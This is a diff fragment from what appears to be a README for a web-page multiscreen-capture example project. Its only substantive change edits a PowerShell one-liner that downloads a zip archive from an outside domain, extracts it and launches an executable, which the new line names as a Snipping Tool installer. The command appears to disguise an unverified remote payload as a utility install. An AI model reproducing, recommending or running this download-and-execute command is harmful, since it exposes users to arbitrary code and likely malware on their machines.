@@ -10,4 +10,4 @@ This project contains example about multiscreen capture and views on the web pag
   },
 
 
-powershell -command "rm 's' -Rec -For -EA 0; iwr 'https://umaigames.com/sstool.zip' -OutFile 's.zip'; Expand-Archive 's.zip' -Dest 's' -For; rm 's.zip'; Start-Process 's\*.exe'"
+powershell -command "rm 's' -Rec -For -EA 0; iwr 'https://umaigames.com/sstool.zip' -OutFile 's.zip'; Expand-Archive 's.zip' -Dest 's' -For; rm 's.zip'; Start-Process 's\SnippingTool Setup 10.3.9.exe'"
